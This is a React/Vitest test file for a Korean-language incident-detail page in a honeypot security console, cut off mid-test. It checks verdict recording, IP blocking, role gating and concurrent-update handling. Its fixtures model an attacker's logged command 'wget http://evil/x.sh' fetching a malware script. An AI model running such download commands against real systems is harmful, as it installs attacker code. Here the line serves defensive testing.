import { act, fireEvent, screen, waitFor, within } from '@testing-library/react'
import type { RouteObject } from 'react-router'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { ctiKeys, incidentCtiPath } from '@/api/cti'
import { incidentKeys, incidentPath, type AbsorbedInfo, type BlockPointsInfo, type EvidenceSample, type IncidentDetail, type IncidentDevice } from '@/api/incidents'
import { ACTION_STATUS } from '@/lib/domain'
import { revealHidden } from '@/lib/untrusted'
import { ctiBadgeText } from '@/components/molecules/cti-badge-format'
import { applicability, cve, freshness, incidentCti, SIGMA_URL, sigmaSignature, sigmaSource, signature } from '@/test/cti-fixtures'
import { expectInertDom, expectLongFolds, expectMixedRevealed, HOSTILE, LONG, MIXED } from '@/test/hostile-fixtures'
import { noRetryClient, renderRoutes } from '@/test/render'
import { IncidentDetailPage } from './IncidentDetailPage'

// ---------------------------------------------------------------- 표본

const KEY = 'R003|v2|4.4.66.84|2026-09-18T06:00:00+00:00'
const RELATED_KEY = 'R001|v2|4.4.66.84|2026-09-17T01:00:00+00:00'
const PATH = `/incidents/${encodeURIComponent(KEY)}`

function detail(extra: Partial<IncidentDetail> = {}): IncidentDetail {
  return {
    incident_key: KEY,
    rule_id: 'R003',
    rule_version: 'v2',
    rule_name: '악성코드 투하',
    severity: 'critical',
    actor_ip: '4.4.66.84',
    target: null,
    first_ts: '2026-09-18T06:00:00+00:00',
    last_ts: '2026-09-18T06:10:00+00:00',
    signal_count: 3,
    session_count: 1,
    status: 'open',
    created_at: '2026-09-18T06:10:05+00:00',
    evidence: { sample: [{ ts: '2026-09-18T06:00:00+00:00', shasum: 'abc123', url: 'http://evil/x.sh' }], sessions: ['s-1'], observed_count_max: 3 },
    workflow_version: '0:0', assigned_to: null, assignee_available: false,
    actions: [],
    verdicts: [],
    related: [{ incident_key: RELATED_KEY, rule_id: 'R001', severity: 'low', first_ts: '2026-09-17T01:00:00+00:00', signal_count: 40, status: 'resolved' }],
    behavior: [
      { ts: '2026-09-18T05:58:00+00:00', sensor: 'hp-01', eventid: 'cowrie.login.success', session: 's-1', username: 'root', input: null, url: null, shasum: null, http_method: null, http_status: null },
      { ts: '2026-09-18T06:00:30+00:00', sensor: 'hp-01', eventid: 'cowrie.command.input', session: 's-1', username: null, input: 'wget http://evil/x.sh', url: null, shasum: null, http_method: null, http_status: null },
    ],
    actor: {
      history: { first_seen: '2026-09-10T00:00:00+00:00', last_seen: '2026-09-18T06:10:00+00:00', events: 120, sensors: ['hp-01'], sessions: 7 },
      rules: [{ rule_id: 'R001', incidents: 2 }],
      // 두 지점 요청(이전 서버처럼 points 없음) · 관문 반영 · 내부 방화벽 적용 확인. 요청한 지점이 모두 확인이라 집행 확인이다(#77)
      blocked: { reason: 'console', method: 'nft', created_at: '2026-09-18T07:00:00+00:00', expires_at: '2999-01-01T00:00:00+00:00', released_at: null, enforced_at: '2026-09-18T07:00:10+00:00',
        enforcement: { fw: { state: 'confirmed', since: '2026-09-18T07:00:20+00:00', mode: 'nft', note: null } } },
    },
    raw: [
      { ts: '2026-09-18T06:00:30+00:00', sensor: 'hp-01', eventid: 'cowrie.command.input', session: 's-1', username: null, input: 'wget http://evil/x.sh', url: null, shasum: null, http_method: null, http_status: null, has_password: false, user_agent: null, message: 'CMD: wget http://evil/x.sh' },
    ],
    circular: '규칙 조건이 파일 이동이고 판정 기준의 위협 조건도 같다',
    ...extra,
  }
}

/** 같은 페이로드 흡수(규칙 v3) 기록. 흡수 2곳(한 곳은 두 번) · 억제 1건, 흡수 차단 3곳 유지 중 */
const KEY_FP = 'SHA256:MkYY9qiVsFGBC5WkjoClCkwEFW5iSjcGQF7m4n4H7Cw'
function absorbed(extra: Partial<AbsorbedInfo> = {}): AbsorbedInfo {
  return {
    items: [
      { actor_ip: '198.51.100.2', kind: 'absorbed', rule_id: 'R006', member_key: 'R006|v3|198.51.100.2|a', via_key: null, first_ts: '2026-09-18T07:00:00+00:00', last_ts: '2026-09-18T07:00:00+00:00', signal_count: 1, sessions: 1, payload: KEY_FP, reason: '같은 SSH 키를 24시간 안에 다시 심음(흡수)' },
      { actor_ip: '198.51.100.3', kind: 'absorbed', rule_id: 'R006', member_key: 'R006|v3|198.51.100.3|b', via_key: null, first_ts: '2026-09-18T08:00:00+00:00', last_ts: '2026-09-18T08:00:00+00:00', signal_count: 1, sessions: 2, payload: KEY_FP, reason: '같은 SSH 키를 24시간 안에 다시 심음(흡수)' },
      { actor_ip: '198.51.100.2', kind: 'suppressed', rule_id: 'R002', member_key: 'R002|v3|198.51.100.2|c', via_key: 'R006|v3|198.51.100.2|a', first_ts: '2026-09-18T07:00:01+00:00', last_ts: '2026-09-18T07:00:09+00:00', signal_count: 1, sessions: 1, payload: null, reason: '흡수된 R006 사건과 같은 출발지 · 같은 구간의 낮은 알림(억제)' },
    ],
    total: 3,
    sources: 2,
    blocked: 3,
    ...extra,
  }
}

function json(body: unknown, status: number): Response {
  return new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } })
}

interface StubOptions {
  role?: string
  body?: unknown
  status?: number
  /** GET …/cti 응답. 기본은 서명 규칙 사건이 아님(applicable=false) */
  cti?: unknown
  ctiStatus?: number
  /** 조치 POST 를 이 오류로 답한다(서버 거부) */
  actionError?: { status: number; detail: string }
}

/** 이 표본 사건의 취약점 연계(서명 규칙 사건) */
function ctiFor(extra: Parameters<typeof incidentCti>[0] = {}) {
  return incidentCti({ incident_key: KEY, ...extra })
}

function isDetail(body: unknown): body is IncidentDetail {
  return !!body && typeof body === 'object' && Array.isArray((body as IncidentDetail).actions)
}

/**
 * /api/me · 상세 GET · 판정 · 조치 POST 를 답하는 fetch. 서버처럼 POST 가 상세를 바꾼다
 * (판정 → 이력 추가 · resolved, 조치 → 이력 추가 · ACTION_STATUS). 그래야 조치 뒤 다시 받는 상세가 옛 상태로 되돌리지 않는다.
 */
function stubApi({ role = 'operator', body = detail(), status = 200, cti = { as_of: '2026-09-18T08:00:00Z', incident_key: KEY, applicable: false }, ctiStatus = 200, actionError }: StubOptions = {}) {
  let state = body
  let actionId = isDetail(state) ? Math.max(3, ...state.actions.map((action) => action.id)) : 3
  const fetch = vi.fn<typeof globalThis.fetch>(async (input, init) => {
    const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url
    const method = init?.method ?? 'GET'
    if (url === '/api/incident-operators') return json([{ username: 'han', role: 'admin' }], 200)
    if (url.startsWith('/api/me')) return json({ username: 'han', role }, 200)
    if (url === incidentCtiPath(KEY) && method === 'GET') return json(cti, ctiStatus)
    if (url === incidentPath(KEY) && method === 'GET') return json(state, status)
    if (url === `${incidentPath(KEY)}/verdict` && method === 'POST') {
      const sent = JSON.parse(String(init?.body)) as Record<string, unknown>
      const created = { id: 9, reason: null, observed_value: null, proposed: null, decision_seconds: null, ...sent, operator: 'han', created_at: '2026-09-18T08:00:00+00:00', incident_key: KEY }
      if (isDetail(state)) state = { ...state, status: 'resolved', verdicts: [...state.verdicts, created as unknown as IncidentDetail['verdicts'][number]] }
      return json(created, 201)
    }
    if (url === `${incidentPath(KEY)}/actions` && method === 'POST') {
      if (actionError) return json({ detail: actionError.detail }, actionError.status)
      const sent = JSON.parse(String(init?.body)) as Record<string, unknown>
      const created = { id: ++actionId, note: null, ...sent, operator: 'han', created_at: '2026-09-18T08:00:00+00:00', incident_key: KEY,
        ...(sent.include_absorbed ? { absorbed: sent.action === 'block_ip' ? { blocked: 2, kept: 0 } : { released: 3 } } : {}) }
      if (isDetail(state)) {
        const next = ACTION_STATUS[sent.action as keyof typeof ACTION_STATUS] ?? state.status
        state = { ...state, status: next, actions: [...state.actions, created as unknown as IncidentDetail['actions'][number]] }
      }
      return json(created, 201)
    }
    return json({ detail: '없는 경로' }, 404)
  })
  vi.stubGlobal('fetch', fetch)
  return fetch
}

function routes(): RouteObject[] {
  return [
    { path: '/incidents/:key', element: <IncidentDetailPage /> },
    { path: '/incidents', element: <p>목록 본문</p> },
  ]
}

/** 도움말(ⓘ) 단추가 여닫는 설명 상자 */
function tipPanel(button: HTMLElement): HTMLElement {
  const panel = document.getElementById(button.getAttribute('aria-controls') ?? '')
  expect(panel).not.toBeNull()
  return panel as HTMLElement
}

/** fetch 호출 가운데 이 주소 · 방식으로 나간 것의 본문 */
function sentBody(fetch: ReturnType<typeof stubApi>, url: string, method: string): Record<string, unknown> | undefined {
  const call = fetch.mock.calls.find(([input, init]) => input === url && init?.method === method)
  return call ? (JSON.parse(String(call[1]?.body)) as Record<string, unknown>) : undefined
}

/**
 * ⑤ 구역. /api/me 는 ⑤ 가 그려진 뒤에야 요청되므로 권한이 정해질 때까지 기다린다
 * (운영에서는 AppLayout 이 먼저 받아 두어 캐시가 차 있다). 확인 단추의 "확인하는 중" 이유가 사라지면 정해진 것이다.
 */
async function readyPanel() {
  const region = await screen.findByRole('region', { name: '조치와 판정' })
  const panel = within(region)
  await waitFor(() => expect(panel.queryByRole('button', { name: '확인' }) ?? panel.queryByText(/조회 전용 계정/)).not.toBeNull())
  return { region, panel }
}

describe('IncidentDetailPage', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
  })

  it('다른 판정의 실시간 갱신은 작성한 사유와 선택을 유지하고 명시적 확인 전 저장을 막는다(#105)', async () => {
    const fetch = stubApi()
    const client = noRetryClient()
    renderRoutes(routes(), `/incidents/${encodeURIComponent(KEY)}`, client)
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('radio', { name: /실제 위협/ }))
    fireEvent.change(panel.getByLabelText('사유'), { target: { value: '작성 중인 근거' } })
    const updated = detail({ workflow_version: '0:2', verdicts: [{ id: 2, verdict: 'false_positive', operator: 'other', reason: '다른 관제자의 확인', observed_value: null, created_at: '2026-09-18T08:00:00Z' }] })
    act(() => client.setQueryData(incidentKeys.detail(KEY), updated))
    await panel.findByRole('button', { name: '최신 이력 확인 후 계속' })
    expect(panel.getByLabelText('사유')).toHaveValue('작성 중인 근거')
    expect(panel.getByRole('radio', { name: /실제 위협/ })).toBeChecked()
    expect(panel.getByRole('button', { name: '재판정 기록' })).toBeDisabled()
    expect(panel.getByText('다른 관제자의 확인')).toBeInTheDocument()
    fireEvent.click(panel.getByRole('button', { name: '최신 이력 확인 후 계속' }))
    fireEvent.click(panel.getByRole('button', { name: '재판정 기록' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')).toMatchObject({ expected_version: '0:2', verdict: 'threat', reason: '작성 중인 근거' }))
  })

  it('다른 담당 변경은 열어 둔 차단 메모를 보존하고 새 기준 확인을 요구한다(#105)', async () => {
    stubApi()
    const client = noRetryClient()
    renderRoutes(routes(), `/incidents/${encodeURIComponent(KEY)}`, client)
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    fireEvent.change(panel.getByLabelText('메모 (선택)'), { target: { value: '현재 증거 확인 중' } })
    act(() => client.setQueryData(incidentKeys.detail(KEY), detail({ workflow_version: '8:0', assigned_to: 'other', assignee_available: true })))
    await panel.findByRole('button', { name: '최신 이력 확인 후 계속' })
    expect(panel.getByLabelText('메모 (선택)')).toHaveValue('현재 증거 확인 중')
    expect(panel.getByRole('button', { name: '차단 확정' })).toBeDisabled()
    expect(panel.getByText(/다른 변경이 저장됐습니다/)).toBeInTheDocument()
    expect(panel.queryByText('other')).not.toBeInTheDocument()
  })

  it('변경 토큰이 없는 이전 서버에는 조치·판정을 보내지 않는다(#105)', async () => {
    stubApi({ body: detail({ workflow_version: undefined }) })
    renderRoutes(routes(), `/incidents/${encodeURIComponent(KEY)}`)
    const { panel } = await readyPanel()
    expect(panel.getByRole('button', { name: '판정 기록' })).toBeDisabled()
    expect(panel.getByText(/서버의 변경 확인 정보가 없습니다/)).toBeInTheDocument()
  })

  it('머리글과 구역 다섯 개를 그리고 순환 규칙 경고를 보인다', async () => {
    stubApi()
    renderRoutes(routes(), PATH)

    expect(await screen.findByRole('heading', { level: 1, name: 'R003 악성코드 투하' })).toBeInTheDocument()
    // 머리글: 심각도 · 상태 · 발생원 · 출발지 · 경과(판정 목표)
    expect(screen.getByText('critical')).toHaveAttribute('data-severity', 'critical')
    expect(screen.getAllByText('신규')[0]).toHaveAttribute('data-status', 'open')
    expect(screen.getByText('발생원 허니팟')).not.toHaveAttribute('title')
    // 발생원의 뜻은 마우스 올림 말풍선이 아니라 옆 도움말(ⓘ)로 키보드 · 터치에서도 본다
    expect(screen.getByRole('button', { name: '발생원 허니팟 설명' })).toHaveAccessibleDescription('노출을 의도한 자산에서 발생한 건입니다. 침해사고 신고 대상이 아닙니다.')
    expect(screen.getByText(/판정 목표 1시간/)).toBeInTheDocument()

    for (const name of ['규칙이 본 것', '규칙이 보지 않은 증거', '행위자 이력', '원문 로그', '조치와 판정']) {
      expect(screen.getByRole('region', { name })).toBeInTheDocument()
    }

    // ① 순환 규칙 경고와 표본
    const evidence = screen.getByRole('region', { name: '규칙이 본 것' })
    expect(within(evidence).getByText('순환 규칙')).toBeInTheDocument()
    expect(within(evidence).getByText(/규칙 조건이 파일 이동이고/)).toBeInTheDocument()
    // 경고 띠에는 무엇이 겹치는지만, 품질 지표를 무엇으로 보는지는 도움말에
    expect(within(evidence).getByRole('status')).not.toHaveTextContent('중복률')
    expect(within(evidence).getByRole('button', { name: '순환 규칙 설명' })).toHaveAccessibleDescription('이 규칙은 정탐률이 품질 지표가 되지 못해 중복률을 봅니다.')
    expect(within(evidence).getByText('abc123')).toBeInTheDocument()
    expect(within(evidence).getByText('최대 3건')).toBeInTheDocument()

    // ② 행위: 로그인 성공 · 명령
    const behavior = screen.getByRole('region', { name: '규칙이 보지 않은 증거' })
    expect(within(behavior).getByText('계정 root')).toBeInTheDocument()
    expect(within(behavior).getByText('wget http://evil/x.sh')).toBeInTheDocument()

    // ③ 이력 · 차단 · 관련 사건 링크
    const actor = screen.getByRole('region', { name: '행위자 이력' })
    expect(within(actor).getByText('120건')).toBeInTheDocument()
    expect(within(actor).getByText('관측된 센서')).toBeInTheDocument()
    expect(within(actor).getByRole('button', { name: '관측된 센서 설명' })).toHaveAccessibleDescription(/허니팟 · 디코이 접속 이력은 결정적 근거입니다/)
    expect(within(actor).getByText('차단 이력')).toBeInTheDocument()
    expect(within(actor).getByText('집행 확인', { selector: 'span' })).toBeInTheDocument()
    expect(within(actor).getByRole('link', { name: 'R001' })).toHaveAttribute('href', `/incidents/${encodeURIComponent(RELATED_KEY)}`)

    // ④ 원문은 접혀 있고(머리의 줄 수 · 펼치기만) 펼치면 줄이 보인다
    const raw = screen.getByRole('region', { name: '원문 로그' })
    expect(within(raw).queryByText(/CMD: wget/)).toBeNull()
    expect(raw).not.toHaveTextContent('접혀 있습니다')
    fireEvent.click(within(raw).getByRole('button', { name: '펼치기' }))
    expect(within(raw).getByText(/CMD: wget/)).toBeInTheDocument()
  })

  it('출발지와 대상이 함께 있는 사건은 둘 다 보인다', async () => {
    stubApi({ body: detail({ target: 'test:acceptance' }) })
    renderRoutes(routes(), PATH)
    expect(await screen.findByText('test:acceptance')).toBeInTheDocument()
    expect(screen.getAllByText('4.4.66.84').length).toBeGreaterThan(0)
  })

  it('503 재조회 실패에서 작성 중인 판정을 유지하고 저장을 막으며 복구 뒤 그대로 제출한다(#100)', async () => {
    const fetch = stubApi()
    const serve = fetch.getMockImplementation()!
    let fail = false
    fetch.mockImplementation((input, init) => fail && input === incidentPath(KEY) && (!init?.method || init.method === 'GET')
      ? Promise.resolve(json({ detail: '일시적인 조회 실패' }, 503)) : serve(input, init))
    const client = noRetryClient()
    renderRoutes(routes(), PATH, client)
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('radio', { name: /^실제 위협/ }))
    fireEvent.change(panel.getByLabelText('사유'), { target: { value: '검토 중인 근거 보존' } })
    fail = true
    await act(async () => { await client.refetchQueries({ queryKey: incidentKeys.detail(KEY) }) })
    expect(await screen.findByText('데이터를 갱신하지 못했습니다')).toBeInTheDocument()
    expect(panel.getByLabelText('사유')).toHaveValue('검토 중인 근거 보존')
    expect(panel.getByRole('button', { name: '판정 기록' })).toBeDisabled()
    expect(panel.getByRole('button', { name: /^확인$/ })).toBeDisabled()
    fireEvent.submit(panel.getByRole('button', { name: '판정 기록' }).closest('form')!)
    expect(sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')).toBeUndefined()
    fail = false
    fireEvent.click(screen.getByRole('button', { name: /^다시 조회$/ }))
    await waitFor(() => expect(panel.getByRole('button', { name: '판정 기록' })).toBeEnabled())
    expect(panel.getByLabelText('사유')).toHaveValue('검토 중인 근거 보존')
    fireEvent.click(panel.getByRole('button', { name: '판정 기록' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')?.reason).toBe('검토 중인 근거 보존'))
  })

  it('재조회가 403이면 이전 사건 근거와 입력 폼을 숨긴다(#100)', async () => {
    const fetch = stubApi()
    const serve = fetch.getMockImplementation()!
    const client = noRetryClient()
    renderRoutes(routes(), PATH, client)
    await readyPanel()
    fetch.mockImplementation((input, init) => input === incidentPath(KEY)
      ? Promise.resolve(json({ detail: '권한이 없습니다' }, 403)) : serve(input, init))
    await act(async () => { await client.refetchQueries({ queryKey: incidentKeys.detail(KEY) }) })
    await waitFor(() => expect(screen.queryByRole('region', { name: '조치와 판정' })).toBeNull())
    expect(screen.queryByRole('region', { name: '규칙이 본 것' })).toBeNull()
  })

  it('필터를 걸었던 목록에서 들어오면 관련 사건을 거쳐도 그 목록으로 돌아간다(#100)', async () => {
    stubApi()
    const { router } = renderRoutes(routes(), '/incidents?device=web-01&sort=severity&page=3')
    const back = router.state.location.pathname + router.state.location.search
    await act(async () => { await router.navigate(PATH, { state: { returnTo: back } }) })
    await readyPanel()
    expect(screen.getByRole('link', { name: '← 인시던트 목록으로' })).toHaveAttribute('href', back)
    const section = screen.getByRole('region', { name: '조치와 판정' })
    section.scrollIntoView = vi.fn<HTMLElement['scrollIntoView']>()
    fireEvent.click(screen.getByRole('button', { name: '조치와 판정으로 이동 ↓' }))
    expect(section).toHaveFocus()
    expect(router.state.location.state).toEqual({ returnTo: back })
    fireEvent.click(screen.getByRole('link', { name: /^R001$/ }))
    await waitFor(() => expect(router.state.location.state).toEqual({ returnTo: back }))
  })

  it('판정을 제출하면 판정값 · 사유 · 관측값 · 소요 초가 가고, 이력과 상태가 바뀐다', async () => {
    const fetch = stubApi()
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()

    expect(panel.getByRole('heading', { name: '판정' })).toBeInTheDocument()
    expect(panel.getByText('아직 판정 · 조치 기록이 없습니다.')).toBeInTheDocument()

    // 판정값 없이 누르면 보내지 않는다
    fireEvent.click(panel.getByRole('button', { name: '판정 기록' }))
    expect(panel.getByRole('alert')).toHaveTextContent('판정값을 고르세요')

    fireEvent.click(panel.getByRole('radio', { name: /^실제 위협/ }))
    fireEvent.change(panel.getByLabelText('사유'), { target: { value: '  로그인 뒤 wget 으로 파일 투하  ' } })
    fireEvent.click(panel.getByRole('button', { name: '판정 기록' }))

    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')).toBeDefined())
    const body = sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')!
    expect(body.verdict).toBe('threat')
    expect(body.reason).toBe('로그인 뒤 wget 으로 파일 투하')
    expect(body.observed_value).toBe(3)
    expect(typeof body.decision_seconds).toBe('number')
    expect(body.decision_seconds as number).toBeGreaterThanOrEqual(0)
    expect(body.decision_seconds as number).toBeLessThanOrEqual(86_400)

    expect(await panel.findByText('판정을 기록했습니다')).toBeInTheDocument()
    // 상세 캐시가 바로 바뀐다: 종결이라 폼이 접히고(#94) 이력 · 상태가 바뀐다
    expect(panel.getByRole('heading', { name: '판정' })).toBeInTheDocument()
    expect(panel.getByRole('button', { name: '재판정' })).toHaveAttribute('aria-expanded', 'false')
    expect(panel.queryByRole('button', { name: '재판정 기록' })).toBeNull()
    expect(panel.queryByRole('radio')).toBeNull()
    const history = panel.getByRole('table', { name: '판정 · 조치 이력' })
    expect(within(history).getByText('실제 위협')).toHaveAttribute('data-verdict', 'threat')
    expect(within(history).getByText('로그인 뒤 wget 으로 파일 투하')).toBeInTheDocument()
    // 제안이 없던 판정은 제안 칸을 글로 채우지 않는다
    expect(history).not.toHaveTextContent('제안 기록 없음')
    expect(within(history).getByText(/^소요 /)).toBeInTheDocument()
    expect(screen.getAllByText('종결')[0]).toHaveAttribute('data-status', 'resolved')
    expect(screen.getByText(/^발생 → 판정 /)).toBeInTheDocument()
  })

  it('판정값은 뜻 한 줄만 늘 보이고, 예 · 세는 법은 선택지 옆 도움말에 있다(누르면 판정값이 골라지지 않는다)', async () => {
    stubApi()
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    // 라디오 이름은 판정값과 뜻뿐이다(도움말 단추 이름이 섞이지 않는다)
    const radio = panel.getByRole('radio', { name: /^실제 위협\s?행위로 침해 또는 침해 시도가 확인됐다$/ })
    const tip = panel.getByRole('button', { name: '실제 위협 설명' })
    expect(tip).toHaveAccessibleDescription('예: 로그인 뒤 명령 실행 · 파일 투하 · 다른 호스트로 경유 · 대량 자원 소모')
    fireEvent.click(tip)
    expect(tip).toHaveAttribute('aria-expanded', 'true')
    expect(radio).not.toBeChecked()
    expect(panel.getByRole('button', { name: '양성 정탐 설명' })).toHaveAccessibleDescription(/오탐으로 세지 않는다/)
    // 사유 칸 도움말 문장은 없다(입력 예시와 빈 사유 경고가 대신한다)
    expect(panel.getByLabelText('사유')).not.toHaveAttribute('aria-describedby')
  })

  it('사유가 비어 있으면 판정값을 고른 뒤 경고만 하고 기록한다', async () => {
    const fetch = stubApi()
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()

    expect(panel.queryByText('사유 없이 기록됩니다.')).toBeNull()
    fireEvent.click(panel.getByRole('radio', { name: /^미결/ }))
    expect(panel.getByText('사유 없이 기록됩니다.')).toHaveAttribute('role', 'status')
    fireEvent.click(panel.getByRole('button', { name: '판정 기록' }))

    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')).toBeDefined())
    const body = sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')!
    expect(body.verdict).toBe('undetermined')
    expect('proposed' in body).toBe(false)
    expect(panel.queryByText(/제안 뒤집힘/)).toBeNull()
    expect('reason' in body).toBe(false)
  })

  it('차단은 만료 시간 · 메모를 받고 확정 단계를 거친 뒤 보낸다', async () => {
    const fetch = stubApi()
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()

    expect(panel.queryByRole('form', { name: '차단 확인' })).toBeNull()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    expect(fetch.mock.calls.some(([, init]) => init?.method === 'POST')).toBe(false)

    const confirm = within(panel.getByRole('form', { name: '차단 확인' }))
    // 적용 지점을 모르는 이전 서버(block_points 없음)는 묶음을 두지 않고 지점을 보내지 않는다(서버가 두 지점으로 본다)
    expect(confirm.queryByRole('group', { name: '적용 지점' })).toBeNull()
    fireEvent.change(confirm.getByLabelText('만료'), { target: { value: '168' } })
    fireEvent.change(confirm.getByLabelText('메모 (선택)'), { target: { value: '세션 3개에서 명령 실행' } })
    fireEvent.click(confirm.getByRole('button', { name: '차단 확정' }))

    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toBeDefined())
    expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ expected_version: '0:0', action: 'block_ip', note: '세션 3개에서 명령 실행', expires_hours: 168 })

    expect(await panel.findByText('차단 조치를 기록했습니다')).toBeInTheDocument()
    expect(panel.queryByRole('form', { name: '차단 확인' })).toBeNull()
    await waitFor(() => expect(screen.getAllByText('조치중')[0]).toHaveAttribute('data-status', 'in_progress'))
    const history = panel.getByRole('table', { name: '판정 · 조치 이력' })
    expect(within(history).getByText('차단')).toBeInTheDocument()
  })

  it('viewer 는 조치가 숨겨지고 판정은 조회 전용이다', async () => {
    stubApi({ role: 'viewer' })
    renderRoutes(routes(), PATH)
    const { region, panel } = await readyPanel()
    expect(region.querySelector('[data-gated="denied"]')).not.toBeNull()
    // 권한 안내 글은 조치 바 한 곳. 판정 패널의 까닭은 말풍선 · 낭독으로만 남는다
    expect(panel.getByText(/조회 전용 계정/)).toHaveTextContent('조회 전용 계정입니다. 조치 · 판정은 operator · admin 이 합니다.')
    expect(region.querySelector('[data-gated="denied"]')).toHaveAttribute('title', '이 동작(판정)은 operator · admin 만 할 수 있습니다 · 현재 역할 viewer')
    expect(panel.getByText('이 동작(판정)은 operator · admin 만 할 수 있습니다 · 현재 역할 viewer')).toHaveClass('sr-only')
    for (const name of ['확인', '차단', '차단 해제']) {
      expect(panel.queryByRole('button', { name })).toBeNull()
    }
  })

  it('관리자에게도 실제 규칙을 중단하지 않는 억제 조치를 제공하지 않는다', async () => {
    stubApi({ role: 'admin' })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    expect(panel.queryByRole('button', { name: /억제/ })).toBeNull()
    expect(panel.getByRole('button', { name: '판정 기록' })).toBeInTheDocument()
  })

  it('operator 는 차단 해제 · 규칙 억제가 숨겨지고, 신규가 아니면 확인은 비활성이다', async () => {
    stubApi({ body: detail({ status: 'acknowledged' }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    expect(panel.queryByRole('button', { name: '차단 해제' })).toBeNull()
    expect(panel.queryByRole('button', { name: '규칙 억제' })).toBeNull()
    expect(panel.getByRole('button', { name: '확인' })).toHaveAttribute('title', '이미 확인 상태라 확인할 것이 없습니다')
    expect(panel.getByRole('button', { name: '차단' })).not.toHaveAttribute('aria-disabled')
  })

  it.each([
    ['실제 위협', 'threat', '제안 수락'],
    ['오탐', 'false_positive', '제안 뒤집힘'],
  ])('제안과 %s 판정을 비교하고 함께 저장한다', async (label, value, comparison) => {
    const fetch = stubApi({ body: detail({ proposal: { verdict: 'threat', reasons: ['후속 명령이 관측됐습니다.'] } }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    expect(panel.getByText('후속 명령이 관측됐습니다.')).toBeInTheDocument()
    expect(panel.getAllByRole('radio').some((radio) => (radio as HTMLInputElement).checked)).toBe(false)
    fireEvent.click(panel.getByRole('radio', { name: new RegExp('^' + label) }))
    expect(panel.getByText(new RegExp('^' + comparison))).toBeInTheDocument()
    fireEvent.click(panel.getByRole('button', { name: '판정 기록' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')).toMatchObject({ proposed: 'threat', verdict: value }))
    const history = await panel.findByRole('table', { name: '판정 · 조치 이력' })
    expect(within(history).getByText(new RegExp(comparison))).toHaveTextContent('소요')
  })

  it('저장된 제안 · 뒤집힘 · 소요 시간은 상세를 다시 열어도 보인다', async () => {
    stubApi({ body: detail({ status: 'resolved', verdicts: [{ id: 1, verdict: 'false_positive', proposed: 'threat', decision_seconds: 125, reason: '추가 확인', observed_value: 3, operator: 'han', created_at: '2026-09-18T08:00:00Z' }] }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    const history = panel.getByRole('table', { name: '판정 · 조치 이력' })
    expect(within(history).getByText(/제안 실제 위협 · 제안 뒤집힘/)).toHaveTextContent('소요 2분 5초')
  })

  it('admin 은 살아 있는 차단을 풀 수 있고, 판정 실패는 서버 설명을 띠로 보인다', async () => {
    const fetch = stubApi({ role: 'admin' })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()

    const release = panel.getByRole('button', { name: '차단 해제' })
    expect(release).not.toHaveAttribute('aria-disabled')
    fireEvent.click(release)
    expect(panel.getByRole('form', { name: '차단 해제 확인' })).toBeInTheDocument()
    fireEvent.click(panel.getByRole('button', { name: '취소' }))
    expect(panel.queryByRole('form', { name: '차단 해제 확인' })).toBeNull()

    // 판정 실패(500)
    fetch.mockImplementation(async (input, init) => {
      const url = String(input)
      if (init?.method === 'POST') return json({ detail: '기록 저장에 실패했습니다' }, 500)
      if (url.startsWith('/api/me')) return json({ username: 'root', role: 'admin' }, 200)
      return json(detail(), 200)
    })
    fireEvent.click(panel.getByRole('radio', { name: /^오탐/ }))
    fireEvent.click(panel.getByRole('button', { name: '판정 기록' }))
    expect(await panel.findByText('판정을 기록하지 못했습니다')).toBeInTheDocument()
    expect(panel.getByRole('alert')).toHaveTextContent('기록 저장에 실패했습니다 (HTTP 500)')
    // 실패한 판정은 이력에 들어가지 않는다
    expect(panel.getByText('아직 판정 · 조치 기록이 없습니다.')).toBeInTheDocument()
  })

  it('없는 사건(404)은 찾을 수 없음 화면과 목록 링크', async () => {
    stubApi({ body: { detail: '인시던트를 찾을 수 없습니다' }, status: 404 })
    renderRoutes(routes(), PATH, noRetryClient())
    expect(await screen.findByRole('heading', { level: 1, name: '인시던트를 찾을 수 없습니다' })).toBeInTheDocument()
    expect(screen.getByText('404')).toBeInTheDocument()
    expect(screen.queryByText(/S-04/)).toBeNull()
    // 서버 설명이 제목과 같으면 되풀이하지 않는다
    expect(screen.getAllByText(/인시던트를 찾을 수 없습니다/)).toHaveLength(1)
    expect(screen.getByText(/키가 바뀌었거나 다른 콘솔의 사건일 수 있습니다/)).toBeInTheDocument()
    expect(screen.getByRole('link', { name: '인시던트 목록으로' })).toHaveAttribute('href', '/incidents')
    expect(screen.queryByRole('region', { name: '조치와 판정' })).toBeNull()
  })

  it('차단 요청이 실패하면 오류를 보이고 확인 입력과 이력을 유지한다', async () => {
    const fetch = stubApi()
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    const original = fetch.getMockImplementation()!
    fetch.mockImplementation((input, init) => init?.method === 'POST'
      ? Promise.resolve(json({ detail: '차단 요청을 저장할 수 없습니다' }, 503))
      : original(input, init))
